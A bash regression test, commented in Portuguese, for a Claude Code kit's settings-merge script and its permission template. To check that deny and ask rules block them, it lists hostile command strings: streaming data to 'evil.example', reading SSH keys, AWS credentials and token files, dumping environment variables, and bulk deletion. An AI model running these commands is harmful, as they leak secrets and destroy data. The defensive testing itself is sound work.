#!/usr/bin/env bash
# Prova de regressão do plugin/scripts/merge-settings.js.
#
# O merge existe porque o instalador antigo sobrescrevia o settings.json e quem
# tinha permissões próprias perdia tudo. A partir daí ele virou "as suas chaves
# ganham" — mas até 0.8.0 só `permissions.allow` era mesclado: `deny` e `ask`
# ficavam de fora, então quem JÁ tinha o kit instalado nunca recebia barreira
# nova, só permissão nova. Perder um deny é abrir buraco de segurança, e o
# instalador não avisava.
#
# Uso: bash tests/test-merge-settings.sh [caminho-do-merge.js]
#   Sem argumento testa o script do repo. Passe a versão anterior para ver os
#   casos falharem (é o que prova que o teste testa alguma coisa).
set -uo pipefail
MERGE="${1:-$(cd "$(dirname "$0")/.." && pwd)/plugin/scripts/merge-settings.js}"
[ -f "$MERGE" ] || { echo "não achei o merge: $MERGE"; exit 2; }
command -v node >/dev/null 2>&1 || { echo "sem node — pulando"; exit 0; }

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
falhas=0

cat > "$TMP/kit.json" <<'JSON'
{
  "language": "portuguese",
  "theme": "dark",
  "extraKnownMarketplaces": {
    "vamoo-ai": {
      "source": { "source": "github", "repo": "VAMOO-AI/claude-kit-mentorados" },
      "autoUpdate": true
    }
  },
  "permissions": {
    "defaultMode": "auto",
    "allow": ["Bash(ls:*)", "Bash(npm test)", "Bash(git status:*)"],
    "deny": ["Read(**/.env)", "Bash(vercel login:*)"]
  }
}
JSON

# Como fica a máquina de quem instalou o kit meses atrás: modo antigo, poucas
# permissões, nenhum deny, e uma preferência própria que não pode sumir.
#
# O `extraKnownMarketplaces` aqui não é invenção do teste: é o que o próprio
# `/plugin marketplace add` escreve no settings.json de quem instalou. Ele é a
# razão de o merge não poder ser tudo-ou-nada nessa chave — a chave JÁ existe,
# então "o seu ganha" significava que o autoUpdate do kit nunca chegava.
#
# Os `hooks` são o que o install.sh de antes da 0.7.0 deixou: ele sobrescrevia o
# settings.json com um que chamava o dispatch do dotcontext no SessionStart e depois
# de todo Write/Edit/Bash — e o merge, que preserva hook seu, preservava esse junto.
# O do Stop é um dispatch que a pessoa configurou por conta própria: não é do kit.
cat > "$TMP/meu.json" <<'JSON'
{
  "theme": "light",
  "statusLine": { "type": "command", "command": "meu-script.sh" },
  "hooks": {
    "SessionStart": [
      { "matcher": "*", "hooks": [
        { "type": "command", "command": "[ \"$PWD\" != \"$HOME\" ] && npx -y @dotcontext/cli@latest hook dispatch --source claude-code || exit 0", "timeout": 60 },
        { "type": "command", "command": "meu-hook.sh" }
      ] }
    ],
    "PostToolUse": [
      { "matcher": "Write|Edit|Bash", "hooks": [
        { "type": "command", "command": "[ \"$PWD\" != \"$HOME\" ] && npx -y @dotcontext/cli@latest hook dispatch --source claude-code || exit 0", "timeout": 60 }
      ] }
    ],
    "Stop": [
      { "hooks": [ { "type": "command", "command": "npx -y @dotcontext/cli@1.2.0 hook dispatch --source claude-code" } ] }
    ]
  },
  "extraKnownMarketplaces": {
    "vamoo-ai": {
      "source": { "source": "directory", "path": "/Users/eu/dev/claude-kit-mentorados" }
    },
    "marketplace-do-meu-time": {
      "source": { "source": "github", "repo": "meu-time/plugins" }
    }
  },
  "permissions": {
    "defaultMode": "default",
    "allow": ["Bash(ls:*)", "Bash(meu-script:*)"]
  }
}
JSON

SAIDA="$(node "$MERGE" "$TMP/kit.json" "$TMP/meu.json" 2>&1)"

# O JSON é lido pelo node, pré-requisito do kit (python não é), e chega pelo stdin, aberto
# pelo bash. No Git Bash o interpretador é nativo do Windows: o /tmp/... escrito dentro do
# código não existe para ele, e o leitor devolvia vazio em todos os casos.
check() { # check <descrição> <expressão JS sobre d> <esperado> [arquivo, padrão meu.json]
  local got; got="$(node -e "
const d = JSON.parse(require('fs').readFileSync(0, 'utf8'));
process.stdout.write(String(JSON.stringify($2)));
" < "${4:-$TMP/meu.json}" 2>/dev/null)"
  if [ "$got" = "$3" ]; then printf '  ok    %s\n' "$1"
  else printf '  FALHA %s (esperado %s, veio %s)\n' "$1" "$3" "$got"; falhas=$((falhas+1)); fi
}

echo "== o que o kit precisa entregar =="
check "deny do kit chega em quem já tinha o kit" \
  "(d.permissions.deny || []).length" "2"
check "allow vira união, sem duplicar o que já havia" \
  "d.permissions.allow.length" "4"
check "chave nova do kit é preenchida" "d.language" '"portuguese"'

echo "== o que é seu e não pode ser tocado =="
check "tema que você escolheu continua o seu" "d.theme" '"light"'
check "statusLine própria sobrevive" "d.statusLine.command" '"meu-script.sh"'
check "sua permissão própria continua na lista" \
  "d.permissions.allow.includes('Bash(meu-script:*)')" "true"
check "modo Manual (\"default\") vira o do kit (auto)" \
  "d.permissions.defaultMode" '"auto"'

echo "== o kit precisa se manter atualizado sozinho =="
check "auto-update do kit é ligado em quem já tinha o marketplace" \
  "d.extraKnownMarketplaces['vamoo-ai'].autoUpdate" "true"
check "a fonte que você já tinha NÃO é trocada pela do kit" \
  "d.extraKnownMarketplaces['vamoo-ai'].source.source" '"directory"'
check "marketplace de outro time continua no arquivo" \
  "'marketplace-do-meu-time' in d.extraKnownMarketplaces" "true"
printf '%s' "$SAIDA" | grep >/dev/null 'extraKnownMarketplaces.vamoo-ai.autoUpdate' \
  && echo "  ok    a saída nomeia o auto-update que ligou" \
  || { echo "  FALHA a saída não nomeia o auto-update: $SAIDA"; falhas=$((falhas+1)); }

echo "== o hook antigo do dotcontext sai; o resto dos hooks é seu =="
check "o dispatch do dotcontext não sobrevive ao setup" \
  "Object.values(d.hooks || {}).flat().flatMap((g) => g.hooks || []).map((h) => h.command).filter((c) => c.includes('@dotcontext/cli@latest hook dispatch'))" "[]"
check "hook seu no mesmo grupo continua" \
  "d.hooks.SessionStart.flatMap((g) => g.hooks).map((h) => h.command)" '["meu-hook.sh"]'
check "evento que só tinha o dispatch some, sem grupo vazio" "'PostToolUse' in d.hooks" "false"
check "dispatch que você configurou de outro jeito fica" \
  "d.hooks.Stop[0].hooks[0].command" '"npx -y @dotcontext/cli@1.2.0 hook dispatch --source claude-code"'

echo "== quem desligou o auto-update de propósito não é religado =="
cat > "$TMP/desligado.json" <<'JSON'
{
  "extraKnownMarketplaces": {
    "vamoo-ai": {
      "source": { "source": "github", "repo": "VAMOO-AI/claude-kit-mentorados" },
      "autoUpdate": false
    }
  }
}
JSON
SAIDA_OFF="$(node "$MERGE" "$TMP/kit.json" "$TMP/desligado.json" 2>&1)"
node -e "
const d = JSON.parse(require('fs').readFileSync(0, 'utf8'));
process.exit(d.extraKnownMarketplaces['vamoo-ai'].autoUpdate === false ? 0 : 1);
" < "$TMP/desligado.json" 2>/dev/null \
  && echo "  ok    autoUpdate:false continua false" \
  || { echo "  FALHA o kit religou um auto-update que a pessoa desligou"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA_OFF" | grep >/dev/null -i 'auto-update' \
  && echo "  ok    avisa que manteve a escolha da pessoa" \
  || { echo "  FALHA não avisou sobre o auto-update desligado: $SAIDA_OFF"; falhas=$((falhas+1)); }

echo "== quem nunca teve marketplace nenhum ganha o bloco inteiro =="
echo '{}' > "$TMP/zerado.json"
node "$MERGE" "$TMP/kit.json" "$TMP/zerado.json" >/dev/null 2>&1
node -e "
const d = JSON.parse(require('fs').readFileSync(0, 'utf8'));
const m = (d.extraKnownMarketplaces || {})['vamoo-ai'] || {};
process.exit(m.autoUpdate === true && (m.source || {}).repo === 'VAMOO-AI/claude-kit-mentorados' ? 0 : 1);
" < "$TMP/zerado.json" 2>/dev/null \
  && echo "  ok    fonte e auto-update chegam juntos" \
  || { echo "  FALHA settings zerado não recebeu o marketplace do kit"; falhas=$((falhas+1)); }
node -e "
process.exit('hooks' in JSON.parse(require('fs').readFileSync(0, 'utf8')) ? 1 : 0);
" < "$TMP/zerado.json" 2>/dev/null \
  && echo "  ok    settings sem hooks não ganha a chave" \
  || { echo "  FALHA a limpeza do hook antigo criou a chave hooks em quem não tinha"; falhas=$((falhas+1)); }

echo "== o instalador precisa dizer o que fez =="
printf '%s' "$SAIDA" | grep >/dev/null 'permissions.deny (+2)' \
  && echo "  ok    a saída nomeia as barreiras acrescentadas" \
  || { echo "  FALHA a saída não nomeia o deny acrescentado: $SAIDA"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA" | grep >/dev/null 'pra voltar ao manual de vez' \
  && printf '%s' "$SAIDA" | grep >/dev/null 'manter-modo-manual' \
  && echo "  ok    diz que trocou o modo e como voltar (com o marcador)" \
  || { echo "  FALHA não explicou a troca de modo nem como voltar: $SAIDA"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA" | grep >/dev/null 'removido: hook antigo do dotcontext (2)' \
  && echo "  ok    a saída nomeia o hook antigo que tirou" \
  || { echo "  FALHA a saída não nomeia a remoção do hook antigo: $SAIDA"; falhas=$((falhas+1)); }

echo "== rodar duas vezes não pode mudar nada =="
ANTES="$(cat "$TMP/meu.json")"
node "$MERGE" "$TMP/kit.json" "$TMP/meu.json" >/dev/null 2>&1
[ "$ANTES" = "$(cat "$TMP/meu.json")" ] \
  && echo "  ok    idempotente" \
  || { echo "  FALHA a segunda passada mudou o arquivo"; falhas=$((falhas+1)); }

echo "== o deny do template cobre supabase/vercel por qualquer runner =="
TEMPLATE="$(cd "$(dirname "$0")/.." && pwd)/plugin/templates/settings.json"
# Em bypass o deny é o único freio, e ele casa por prefixo: `supabase db push:*` não pega
# `npx -y supabase@latest db push`, `bunx supabase …` nem `pnpm dlx supabase …` (issue #137).
# Todo deny de supabase/vercel precisa da forma com curinga em cada runner.
SEM_RUNNER="$(node -e '
const d = require(process.argv[1]).permissions.deny
const rs = ["npx","bunx","bun","pnpx","pnpm","npm","yarn"]
const falta = []
for (const e of d) {
  const m = e.match(/^Bash\((supabase|vercel) (.*):\*\)$/)
  if (!m) continue
  for (const r of rs) { const n = `Bash(${r} *${m[1]}* ${m[2]} *)`; if (!d.includes(n)) falta.push(n) }
}
console.log(falta.join(" "))' "$TEMPLATE")"
if [ -z "$SEM_RUNNER" ]; then echo "  ok    todo deny de supabase/vercel cobre os runners (npx, bunx, pnpm…)"
else echo "  FALHA deny sem a forma por runner: $SEM_RUNNER"; falhas=$((falhas+1)); fi

# O glob do deny é quase o do `case` do bash; a diferença é o ` *` final, que o matcher do
# Claude Code também aceita sem argumento nenhum, mas SÓ quando é o único curinga da regra
# (code.claude.com/docs/en/permissions#wildcard-patterns: `Bash(* --help *)` não casa
# `npm --help`). `Bash(npx *supabase* db push *)` tem três curingas e não pega
# `npx supabase db push`; quem pega é o gêmeo sem o ` *` final (issue #249). Até a 0.61.1 este
# teste aceitava o comando sem argumento em qualquer regra e dava verde sem cobertura. O
# sufixo é ` *`, não `*`: `link*` pegava `functions deploy link-preview`.
PADROES="$(node -e 'for (const e of require(process.argv[1]).permissions.deny)
  if (e.startsWith("Bash(") && !e.endsWith(":*)")) console.log(e.slice(5, -1))' "$TEMPLATE")"
negado() {
  local p; while IFS= read -r p; do
    [ -z "$p" ] && continue
    # shellcheck disable=SC2254  # o padrão é glob de propósito
    case "$1" in $p) return 0 ;; esac
    case "$p" in *' *') case "${p% \*}" in *'*'*) ;; *) [ "$1" = "${p% \*}" ] && return 0 ;; esac ;; esac
  done <<< "$PADROES"; return 1
}
for c in 'npx supabase db push' 'npx -y supabase@latest db push --linked' 'bunx supabase db push' \
         'pnpm dlx supabase link --project-ref x' 'pnpm exec supabase login' 'yarn dlx vercel@latest login' \
         'npm exec -- supabase db push' 'bun x supabase login' 'npx vercel login'; do
  if negado "$c"; then echo "  ok    deny pega: $c"; else echo "  FALHA deny não pega: $c"; falhas=$((falhas+1)); fi
done
for c in 'npx supabase db reset' 'npx supabase migration new link_table' 'npx supabase unlink' 'pnpm test' \
         'npx supabase functions deploy link-preview' 'npx supabase functions deploy login-handler' \
         'pnpm exec supabase functions deploy link-preview' 'pnpm dlx supabase functions deploy login-handler' \
         'yarn dlx supabase migration new link_table' 'npm exec supabase functions deploy linkedin-sync'; do
  if negado "$c"; then echo "  FALHA deny pega rotina: $c"; falhas=$((falhas+1)); else echo "  ok    deny deixa: $c"; fi
done
# Invariante do #249: todo padrão de deny ou ask com mais de um curinga que termina em ` *`
# tem o gêmeo sem o ` *` final, em Bash e em PowerShell (a doc diz que as regras PowerShell
# têm "the same shape as Bash rules"). Os casos acima só cobrem o gêmeo que tem caso; este
# cobre todos, inclusive o do próximo padrão que entrar.
SEM_GEMEO="$(node -e '
const p = require(process.argv[1]).permissions
const falta = []
for (const l of ["deny", "ask"]) {
  const lista = p[l] || []
  for (const r of lista) {
    const m = /^(Bash|PowerShell)\(([\s\S]*) \*\)$/.exec(r)
    if (!m || !m[2].includes("*")) continue
    const g = `${m[1]}(${m[2]})`
    if (!lista.includes(g)) falta.push(`${l}:${g}`)
  }
}
console.log(falta.join("\n"))' "$TEMPLATE")"
if [ -z "$SEM_GEMEO" ]; then echo "  ok    todo padrão com mais de um curinga que termina em ' *' tem o gêmeo"
else echo "  FALHA falta o gêmeo sem o ' *' final ($(printf '%s\n' "$SEM_GEMEO" | wc -l | tr -d ' ')): $(printf '%s\n' "$SEM_GEMEO" | head -3 | tr '\n' ' ')…"; falhas=$((falhas+1)); fi

# `Read(**/.env.*)` bloquearia o .env.example, que é commitado e lido de propósito; os
# arquivos de ambiente com segredo vão enumerados.
# Âncora `//` (raiz do disco), não `**/` solto: "a rule only matches files under its anchor",
# e sem âncora a regra só vale abaixo da pasta do projeto. Medido em 15/10/2026 (espelho de
# VAMOO-AI/claude-config-team#332): com `Read(**/.env.local)`, `cat` num .env.local falso FORA
# do projeto leu em bypass; com `Read(//**/.env.local)` foi negado nos dois modos.
for e in .env .env.local .env.production .env.development .env.staging .env.tokens; do
  if node -e 'process.exit(require(process.argv[1]).permissions.deny.includes(process.argv[2]) ? 0 : 1)' \
       "$TEMPLATE" "Read(//**/$e)"; then echo "  ok    deny de leitura: $e (ancorado em //)"
  else echo "  FALHA falta deny de leitura ancorado: Read(//**/$e)"; falhas=$((falhas+1)); fi
done
if node -e 'process.exit(require(process.argv[1]).permissions.deny.some(r => r.startsWith("Read(**")) ? 0 : 1)' "$TEMPLATE"; then
  echo "  FALHA regra Read(**/…) sem âncora: só vale abaixo da pasta do projeto"; falhas=$((falhas+1))
else echo "  ok    toda regra Read de segredo é ancorada na raiz (//)"; fi

echo "== modo de permissão: Manual, ausente e acceptEdits viram auto; o resto fica =="
# Pedido do Ruan (10/10/2026): mentorado não fica no manual pedindo "Permitir" a cada
# edição. Até a 0.47.x o kit só avisava; quem estava em "default" continuava lá. Da 0.48.0
# à 0.55.0 o destino era acceptEdits; desde a 0.56.0 (decisão de 18/10/2026) é auto. Na
# 0.56.0 quem já estava em acceptEdits só ganhava aviso; desde a 0.56.1 (decisão de
# 19/10/2026) vira auto também, salvo o marcador kit-vamoo/manter-accept-edits — ou o
# manter-modo-manual, que promete "o setup não troca mais o seu modo".
modo_apos() { # modo_apos <modo-inicial|-> [marcador|marcador-accept] → imprime o defaultMode final
  local dir="$TMP/modo-$RANDOM$RANDOM"; mkdir -p "$dir"
  if [ "$1" = "-" ]; then echo '{"permissions":{}}' > "$dir/settings.json"
  else printf '{"permissions":{"defaultMode":"%s"}}\n' "$1" > "$dir/settings.json"; fi
  [ "${2:-}" = marcador ] && { mkdir -p "$dir/kit-vamoo"; : > "$dir/kit-vamoo/manter-modo-manual"; }
  [ "${2:-}" = marcador-accept ] && { mkdir -p "$dir/kit-vamoo"; : > "$dir/kit-vamoo/manter-accept-edits"; }
  node "$MERGE" "$TMP/kit.json" "$dir/settings.json" > "$dir/saida.txt" 2>&1
  node -e 'const m=require(process.argv[1]).permissions.defaultMode; console.log(m===undefined?"(nenhum)":m)' "$dir/settings.json"
  ULTIMO_DIR="$dir"
}
esperado() { # esperado <descrição> <obtido> <esperado>
  if [ "$2" = "$3" ]; then echo "  ok    $1"; else echo "  FALHA $1 (esperado $3, veio $2)"; falhas=$((falhas+1)); fi
}
esperado "sem modo nenhum vira auto" "$(modo_apos -)" "auto"
esperado "default vira auto" "$(modo_apos default)" "auto"
for m in auto bypassPermissions plan dontAsk; do
  esperado "$m é mantido" "$(modo_apos "$m")" "$m"
done
esperado "acceptEdits vira auto" "$(modo_apos acceptEdits)" "auto"
modo_apos acceptEdits >/dev/null
grep -qF 'Accept edits ("acceptEdits") → "auto"' "$ULTIMO_DIR/saida.txt" && grep -q 'manter-accept-edits' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    a saída diz que saiu do acceptEdits e como voltar (com o marcador)" \
  || { echo "  FALHA a troca do acceptEdits não explica o que mudou nem como voltar: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
ANTES_AE="$(cat "$ULTIMO_DIR/settings.json")"
SEGUNDA_AE="$(node "$MERGE" "$TMP/kit.json" "$ULTIMO_DIR/settings.json" 2>&1)"
[ "$ANTES_AE" = "$(cat "$ULTIMO_DIR/settings.json")" ] && ! printf '%s' "$SEGUNDA_AE" | grep >/dev/null 'modo de permissão' \
  && echo "  ok    depois de migrar o acceptEdits, a segunda passada fica calada" \
  || { echo "  FALHA segunda passada depois do acceptEdits mexeu ou anunciou: $SEGUNDA_AE"; falhas=$((falhas+1)); }
esperado "marcador kit-vamoo/manter-accept-edits segura o acceptEdits" "$(modo_apos acceptEdits marcador-accept)" "acceptEdits"
modo_apos acceptEdits marcador-accept >/dev/null
grep -q 'porque existe .*manter-accept-edits' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    com o marcador a saída diz que manteve o Accept edits" \
  || { echo "  FALHA com o marcador a saída não explica: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
esperado "manter-modo-manual também segura o acceptEdits" "$(modo_apos acceptEdits marcador)" "acceptEdits"
esperado "manter-accept-edits não segura o Manual (cada marcador vale para o seu modo)" "$(modo_apos default marcador-accept)" "auto"
for m in auto bypassPermissions plan dontAsk; do
  modo_apos "$m" >/dev/null
  if grep -q 'modo de permissão' "$ULTIMO_DIR/saida.txt"; then
    echo "  FALHA $m mantido, mas a saída fala do modo: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1))
  else echo "  ok    $m mantido em silêncio"; fi
done
modo_apos - >/dev/null
grep -q 'abre em Manual' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    a troca para auto avisa que sem Auto disponível a sessão abre em Manual" \
  || { echo "  FALHA a troca para auto não explica o fallback: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
esperado "marcador kit-vamoo/manter-modo-manual segura o default" "$(modo_apos default marcador)" "default"
esperado "marcador também segura quem não tem modo" "$(modo_apos - marcador)" "(nenhum)"
modo_apos default marcador >/dev/null
grep -q 'mantive o manual' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    com marcador a saída diz que manteve o manual" \
  || { echo "  FALHA com marcador a saída não explica: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
modo_apos default >/dev/null
ANTES_MODO="$(cat "$ULTIMO_DIR/settings.json")"
SEGUNDA="$(node "$MERGE" "$TMP/kit.json" "$ULTIMO_DIR/settings.json" 2>&1)"
[ "$ANTES_MODO" = "$(cat "$ULTIMO_DIR/settings.json")" ] && ! printf '%s' "$SEGUNDA" | grep >/dev/null 'modo de permissão' \
  && echo "  ok    segunda passada não troca nem anuncia o modo de novo" \
  || { echo "  FALHA segunda passada mexeu no modo: $SEGUNDA"; falhas=$((falhas+1)); }

echo "== regras do template: PowerShell, ask e nada genérico =="
# Matcher igual ao da doc (code.claude.com/docs/en/permissions#wildcard-patterns): `*` casa
# qualquer texto; o ` *` final casa também o comando sem argumento, mas SÓ quando é o único
# curinga da regra. `git push * --force *` não pega `git push origin x --force`.
casa() { # casa <lista allow|ask|deny> <Ferramenta> <comando> → 0 se alguma regra casa
  node -e '
const [tpl, lista, tool, cmd] = process.argv.slice(1)
const regras = require(tpl).permissions[lista] || []
const pref = tool + "("
const ok = regras.some((r) => {
  if (!r.startsWith(pref) || !r.endsWith(")")) return false
  let p = r.slice(pref.length, -1)
  if (p.endsWith(":*")) p = p.slice(0, -2) + " *"
  const so1 = (p.match(/\*/g) || []).length === 1
  const esc = (t) => t.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, "[\\s\\S]*")
  const re = so1 && p.endsWith(" *") ? "^" + esc(p.slice(0, -2)) + "( [\\s\\S]*)?$" : "^" + esc(p) + "$"
  return new RegExp(re, tool === "PowerShell" ? "i" : "").test(cmd)
})
process.exit(ok ? 0 : 1)' "$TEMPLATE" "$1" "$2" "$3"
}
for tool in Bash PowerShell; do
  for c in 'git push --force' 'git push origin feat --force' 'git push -f origin feat' 'git push origin feat -f' \
           'git push origin +main' 'git push origin --delete feat' 'git push --mirror' \
           'git push origin main' 'git push -u origin main' 'git push origin HEAD:main' 'git push origin master' \
           'git reset --hard HEAD~1' 'git reset HEAD~1 --hard' 'git clean -fdx' 'git branch -D feat' \
           'gh pr merge 12 --squash' 'gh repo delete dono/repo --yes'; do
    if casa ask "$tool" "$c"; then echo "  ok    ask ($tool): $c"; else echo "  FALHA ask não pega ($tool): $c"; falhas=$((falhas+1)); fi
  done
  for c in 'git push' 'git push -u origin feat/login' 'git push --force-with-lease' 'git push origin feat/main' \
           'git push origin main-fix' 'git commit -m "feat: x"' 'git add src/a.ts' 'gh pr create --fill' \
           'git switch -c feat/x' 'git checkout -b feat/x' 'git fetch origin' 'git pull --ff-only' \
           'ffprobe a.mp4' 'npx remotion render' 'npm test' 'npx tsc --noEmit' 'git push origin HEAD'; do
    if casa ask "$tool" "$c"; then echo "  FALHA ask pega rotina ($tool): $c"; falhas=$((falhas+1))
    elif casa allow "$tool" "$c"; then echo "  ok    livre ($tool): $c"
    else echo "  FALHA não está no allow ($tool): $c"; falhas=$((falhas+1)); fi
  done
  # 0.48.0 (revisão do #170): com acceptEdits o Claude escreve scripts/x.py e roda sem pergunta
  # — execução arbitrária. Runner de script e ffmpeg (saída http://, -y fora do projeto) saem
  # do allow global; projeto que precisa declara o script exato no próprio .claude/settings.json.
  # 0.56.0 (decisão de 18/10/2026): `awk` com system(), `npx tsx` num .ts recém-escrito e
  # `npm run` depois de editar o package.json são o mesmo buraco, e saem do allow.
  for c in 'node -e "require(1)"' 'python3 -c "print(1)"' 'bash -c "x"' 'node script-solto.js' \
           'node scripts/build.js' 'python3 scripts/x.py' 'bash scripts/deploy.sh' 'python scripts/x.py' \
           'py scripts/x.py' 'ffmpeg -i a.mov b.mp4' 'ffmpeg -i a.mov -f mpegts http://evil.example/x' \
           "awk 'BEGIN{system(\"id\")}'" 'npx tsx scripts/x.ts' 'npm run dev' 'npm run build'; do
    if casa allow "$tool" "$c"; then echo "  FALHA allow genérico deixa passar ($tool): $c"; falhas=$((falhas+1))
    else echo "  ok    continua pedindo ($tool): $c"; fi
  done
done
# A doc garante o deny de Read só para os comandos de arquivo do BASH (cat, head, tail…). Cmdlet
# de leitura do PowerShell no allow lia .env e chave SSH sem pergunta: fica fora do allow.
for c in 'Get-Content .env' 'Get-Content .env.local' 'Get-Content ~/.ssh/id_rsa' 'gc ~/.claude/.env.tokens' \
         'Select-String -Path .env -Pattern KEY' 'Get-Content README.md'; do
  if casa allow PowerShell "$c"; then echo "  FALHA leitura de arquivo pelo PowerShell aprovada sem pergunta: $c"; falhas=$((falhas+1))
  else echo "  ok    leitura pelo PowerShell continua pedindo: $c"; fi
done
echo "== revisão do #170: regra que vale mesmo sem o hook (Windows sem Git Bash) =="
for tool in Bash PowerShell; do
  for c in 'env' 'printenv' 'printenv GITHUB_TOKEN' 'export -p' 'git push -uf origin feat' 'git push origin HEAD:refs/heads/main' \
           'git push --all origin' 'git checkout -f feat/y' 'git checkout feat/y --force' 'git switch --discard-changes feat/y' \
           'git switch -f feat/y' 'git restore .' 'git checkout -- .' 'git stash drop' 'git stash clear' \
           'find . -name "*.log" -delete' 'find . -type f -exec rm {} ;' 'cat ~/.ssh/id_ed25519' 'cat ~/.aws/credentials' \
           'cat ~/.claude/.env.tokens' 'cat ~/.config/gh/hosts.yml' 'cat ~/.netrc'; do
    if casa ask "$tool" "$c"; then echo "  ok    ask ($tool): $c"; else echo "  FALHA ask não pega ($tool): $c"; falhas=$((falhas+1)); fi
  done
done
for c in 'Get-ChildItem Env:' 'gci env:' 'ls env:' 'dir Env:' 'Get-Item Env:GITHUB_TOKEN' 'Get-ChildItem -Path Env:' \
         '[Environment]::GetEnvironmentVariables()' 'git diff --no-index NUL $HOME\.ssh\id_ed25519'; do
  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
done
for c in 'ssh -T git@github.com' 'git status' 'npm run build' 'grep -rn "process.env" src' 'git log --oneline -5' 'git restore --staged .'; do
  if casa ask Bash "$c"; then echo "  FALHA ask pega rotina: $c"; falhas=$((falhas+1)); else echo "  ok    rotina não pergunta: $c"; fi
done
RUINS="$(node -e 'for (const l of ["allow","ask","deny"]) for (const r of require(process.argv[1]).permissions[l]||[]) if (/:\*\)$/.test(r) && r.slice(0,-3).includes("*")) console.log(r)' "$TEMPLATE")"
[ -z "$RUINS" ] && echo "  ok    nenhuma regra termina em ':*' com outro curinga (a doc lê como ' *')" \
  || { echo "  FALHA regra que termina em ':*' com outro curinga: $RUINS"; falhas=$((falhas+1)); }
for c in 'Get-ChildItem Env:' 'Get-ChildItem Env:GITHUB_TOKEN'; do
  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
done
grep -q '"Bash(env)"' <(node -e 'console.log(JSON.stringify(require(process.argv[1]).permissions.allow))' "$TEMPLATE") \
  && { echo "  FALHA Bash(env) ainda está no allow do template"; falhas=$((falhas+1)); } || echo "  ok    Bash(env) saiu do allow do template"

echo "== os allows de execução arbitrária que o kit gravou saem de quem os tem =="
# Até a 0.55.0 o template trazia Bash(awk:*), Bash(npx tsx:*), Bash(npm run:*) e os gêmeos
# PowerShell. O allow é união, então tirar do template não tirava de quem já rodou o setup:
# o merge tira o texto exato que o kit gravou e deixa o resto do allow da pessoa.
cat > "$TMP/legado.json" <<'JSON'
{ "permissions": { "defaultMode": "acceptEdits", "allow": ["Bash(ls:*)", "Bash(awk:*)", "Bash(npm run:*)", "Bash(npx tsx:*)", "PowerShell(npm run *)", "PowerShell(npx tsx *)", "Bash(npm run build)", "Bash(meu-script:*)"] } }
JSON
SAIDA_L="$(node "$MERGE" "$TEMPLATE" "$TMP/legado.json" 2>&1)"
for r in 'Bash(awk:*)' 'Bash(npm run:*)' 'Bash(npx tsx:*)' 'PowerShell(npm run *)' 'PowerShell(npx tsx *)'; do
  if node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TMP/legado.json" "$r"; then
    echo "  ok    $r saiu do allow"
  else echo "  FALHA $r continua no allow de quem já tinha o kit"; falhas=$((falhas+1)); fi
done
for r in 'Bash(npm run build)' 'Bash(meu-script:*)' 'Bash(ls:*)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 0 : 1)' "$TMP/legado.json" "$r" \
    && echo "  ok    allow seu fica: $r" || { echo "  FALHA o merge tirou um allow que não era do kit: $r"; falhas=$((falhas+1)); }
done
printf '%s' "$SAIDA_L" | grep >/dev/null -F 'removido do allow: Bash(awk:*), Bash(npm run:*), Bash(npx tsx:*), PowerShell(npm run *), PowerShell(npx tsx *)' \
  && echo "  ok    a saída nomeia os allows que tirou" || { echo "  FALHA a saída não nomeia a remoção: $SAIDA_L"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA_L" | grep >/dev/null -F '"Bash(npm run build)"' \
  && echo "  ok    a saída ensina a liberar o comando exato no projeto" || { echo "  FALHA a saída não diz como liberar no projeto: $SAIDA_L"; falhas=$((falhas+1)); }
ANTES_L="$(cat "$TMP/legado.json")"
SAIDA_L2="$(node "$MERGE" "$TEMPLATE" "$TMP/legado.json" 2>&1)"
[ "$ANTES_L" = "$(cat "$TMP/legado.json")" ] && ! printf '%s' "$SAIDA_L2" | grep >/dev/null 'removido do allow' \
  && echo "  ok    segunda passada não mexe nem anuncia a remoção de novo" \
  || { echo "  FALHA segunda passada mexeu ou repetiu a remoção: $SAIDA_L2"; falhas=$((falhas+1)); }
for r in 'Bash(awk:*)' 'Bash(npm run:*)' 'Bash(npx tsx:*)' 'PowerShell(npm run *)' 'PowerShell(npx tsx *)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TEMPLATE" "$r" \
    && echo "  ok    template não traz $r" || { echo "  FALHA template ainda traz $r"; falhas=$((falhas+1)); }
done
node -e 'process.exit(require(process.argv[1]).permissions.defaultMode === "auto" ? 0 : 1)' "$TEMPLATE" \
  && echo "  ok    template em defaultMode auto" || { echo "  FALHA template fora do auto"; falhas=$((falhas+1)); }

echo "== o setup avisa quando um ask do kit anula um allow seu =="
cat > "$TMP/meu-allow.json" <<'JSON'
{ "permissions": { "defaultMode": "acceptEdits", "allow": ["Bash(git push origin main)", "Bash(env)", "Bash(git status:*)", "Bash(meu-script:*)"] } }
JSON
SAIDA_A="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
for r in 'Bash(git push origin main)' 'Bash(env)'; do
  printf '%s' "$SAIDA_A" | grep >/dev/null -F -- "- $r (agora pergunta" && echo "  ok    avisa que $r passa a perguntar" \
    || { echo "  FALHA não avisou de $r: $SAIDA_A"; falhas=$((falhas+1)); }
done
